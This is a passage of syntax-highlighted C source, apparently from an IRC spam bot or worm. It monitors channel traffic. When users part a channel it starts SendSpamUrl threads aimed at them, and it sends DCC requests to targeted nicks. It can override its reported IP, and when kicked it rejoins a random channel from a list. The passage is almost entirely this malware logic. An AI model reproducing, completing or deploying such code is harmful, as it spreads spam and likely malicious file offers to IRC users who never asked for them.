                                            </span><span class="sc11">lstrcpy</span><span class="sc10">(</span><span class="sc11">xDccInfo</span><span class="sc10">.</span><span class="sc11">xNick</span><span class="sc10">,</span><span class="sc11">xSpamInfo</span><span class="sc10">.</span><span class="sc11">nick2spam</span><span class="sc10">);</span><span class="sc0">

                                            </span><span class="sc11">XThread</span><span class="sc10">(</span><span class="sc11">SendDccRequest</span><span class="sc10">,&amp;</span><span class="sc11">xDccInfo</span><span class="sc10">);</span><span class="sc0">
                                        </span><span class="sc10">}</span><span class="sc0">


                                    </span><span class="sc10">}</span><span class="sc0">
                                </span><span class="sc10">}</span><span class="sc0">
                            </span><span class="sc10">}</span><span class="sc0">
                            </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">strstr</span><span class="sc10">(</span><span class="sc11">buffer</span><span class="sc10">,</span><span class="sc6">"PART"</span><span class="sc10">)!=</span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0">
                            </span><span class="sc10">{</span><span class="sc0">
                                    </span><span class="sc2">//process PART
</span><span class="sc0">                                </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">GetNickFromBuffer</span><span class="sc10">(</span><span class="sc11">xSpamInfo</span><span class="sc10">.</span><span class="sc11">nick2spam</span><span class="sc10">,</span><span class="sc11">buffer</span><span class="sc10">)==</span><span class="sc11">TRUE</span><span class="sc10">)</span><span class="sc0">
                                </span><span class="sc10">{</span><span class="sc0">
                                    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">lstrcmp</span><span class="sc10">(</span><span class="sc11">nick</span><span class="sc10">,</span><span class="sc11">xSpamInfo</span><span class="sc10">.</span><span class="sc11">nick2spam</span><span class="sc10">)!=</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
                                    </span><span class="sc10">{</span><span class="sc0">                                   
                                        </span><span class="sc11">xSpamInfo</span><span class="sc10">.</span><span class="sc11">xsocket</span><span class="sc10">=</span><span class="sc11">Irc_Socket</span><span class="sc10">;</span><span class="sc0">
                                        </span><span class="sc11">xSpamInfo</span><span class="sc10">.</span><span class="sc11">AutoSpam</span><span class="sc10">=</span><span class="sc11">TRUE</span><span class="sc10">;</span><span class="sc0">

                                        </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">OverRideIP</span><span class="sc10">==</span><span class="sc11">TRUE</span><span class="sc10">)</span><span class="sc0">
                                        </span><span class="sc10">{</span><span class="sc0">
                                            </span><span class="sc11">xSpamInfo</span><span class="sc10">.</span><span class="sc11">OveRideIp</span><span class="sc10">=</span><span class="sc11">TRUE</span><span class="sc10">;</span><span class="sc0">
                                            </span><span class="sc11">lstrcpy</span><span class="sc10">(</span><span class="sc11">xSpamInfo</span><span class="sc10">.</span><span class="sc11">Oip</span><span class="sc10">,</span><span class="sc11">xIp</span><span class="sc10">);</span><span class="sc0">
                                        </span><span class="sc10">}</span><span class="sc0">
                                        </span><span class="sc5">else</span><span class="sc0">
                                            </span><span class="sc11">xSpamInfo</span><span class="sc10">.</span><span class="sc11">OveRideIp</span><span class="sc10">=</span><span class="sc11">FALSE</span><span class="sc10">;</span><span class="sc0">

                                        </span><span class="sc11">XThread</span><span class="sc10">(</span><span class="sc11">SendSpamUrl</span><span class="sc10">,&amp;</span><span class="sc11">xSpamInfo</span><span class="sc10">);</span><span class="sc0">
                                    </span><span class="sc10">}</span><span class="sc0">
                                </span><span class="sc10">}</span><span class="sc0">
                            </span><span class="sc10">}</span><span class="sc0">
                            </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">strstr</span><span class="sc10">(</span><span class="sc11">buffer</span><span class="sc10">,</span><span class="sc6">"KICK"</span><span class="sc10">)!=</span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0">
                            </span><span class="sc10">{</span><span class="sc0">
                                </span><span class="sc2">//process KICK
</span><span class="sc0">                                
                                </span><span class="sc11">p1</span><span class="sc10">=</span><span class="sc11">strstr</span><span class="sc10">(</span><span class="sc11">buffer</span><span class="sc10">,</span><span class="sc6">"KICK"</span><span class="sc10">);</span><span class="sc0">

                                </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">p1</span><span class="sc10">!=</span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0">
                                </span><span class="sc10">{</span><span class="sc0">
                                    </span><span class="sc11">p1</span><span class="sc10">+=</span><span class="sc4">5</span><span class="sc10">;</span><span class="sc0">

                                    </span><span class="sc5">if</span><span class="sc10">(*</span><span class="sc11">p1</span><span class="sc10">==</span><span class="sc7">'#'</span><span class="sc10">)</span><span class="sc0">
                                    </span><span class="sc10">{</span><span class="sc0">
                                        </span><span class="sc5">do</span><span class="sc0">
                                        </span><span class="sc10">{</span><span class="sc0">
                                            </span><span class="sc11">p1</span><span class="sc10">++;</span><span class="sc0">
                                        </span><span class="sc10">}</span><span class="sc5">while</span><span class="sc10">(*</span><span class="sc11">p1</span><span class="sc10">!=</span><span class="sc4">0x20</span><span class="sc10">);</span><span class="sc0">
                                        
                                        </span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">

                                        </span><span class="sc5">do</span><span class="sc0">
                                        </span><span class="sc10">{</span><span class="sc0">
                                            </span><span class="sc11">p1</span><span class="sc10">++;</span><span class="sc0">
                                            </span><span class="sc11">kicked_nick</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]=*</span><span class="sc11">p1</span><span class="sc10">;</span><span class="sc0">
                                            </span><span class="sc11">i</span><span class="sc10">++;</span><span class="sc0">
                                        </span><span class="sc10">}</span><span class="sc5">while</span><span class="sc10">(*</span><span class="sc11">p1</span><span class="sc10">!=</span><span class="sc4">0x20</span><span class="sc10">);</span><span class="sc0">
                                
                                        </span><span class="sc11">kicked_nick</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">]=</span><span class="sc5">NULL</span><span class="sc10">;</span><span class="sc0">

                                        </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">lstrcmp</span><span class="sc10">(</span><span class="sc11">kicked_nick</span><span class="sc10">,</span><span class="sc11">nick</span><span class="sc10">)==</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
                                        </span><span class="sc10">{</span><span class="sc0">
                                            </span><span class="sc2">//if kicked join new channel
</span><span class="sc0">
                                            </span><span class="sc11">wsprintf</span><span class="sc10">(</span><span class="sc11">buffer</span><span class="sc10">,</span><span class="sc6">"JOIN %s\r\n"</span><span class="sc10">,</span><span class="sc0">
                                                </span><span class="sc11">channels_list</span><span class="sc10">[</span><span class="sc11">rand</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">%</span><span class="sc0"> </span><span class="sc11">number_of_channels</span><span class="sc10">]);</span><span class="sc0">
                        
                                            </span><span class="sc11">send</span><span class="sc10">(</span><span class="sc11">Irc_Socket</span><span class="sc10">,</span><span class="sc11">buffer</span><span class="sc10">,</span><span class="sc11">lstrlen</span><span class="sc10">(</span><span class="sc11">buffer</span><span class="sc10">),</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
                                        </span><span class="sc10">}</span><span class="sc0">
                                    </span><span class="sc10">}</span><span class="sc0">
                                </span><span class="sc10">}</span><span class="sc0">
                            </span><span class="sc10">}</span><span class="sc0">

</span><span class="sc11">do_recv</span><span class="sc10">:</span><span class="sc0">
                            </span><span class="sc11">retval</span><span class="sc10">=</span><span class="sc11">myrecv</span><span class="sc10">(</span><span class="sc11">FALSE</span><span class="sc10">);</span><span class="sc0">

                        </span><span class="sc10">}</span><span class="sc0">
                    
                    
                    </span><span class="sc10">}</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc11">closesocket</span><span class="sc10">(</span><span class="sc11">Irc_Socket</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">FALSE</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span></div></body>
</html>
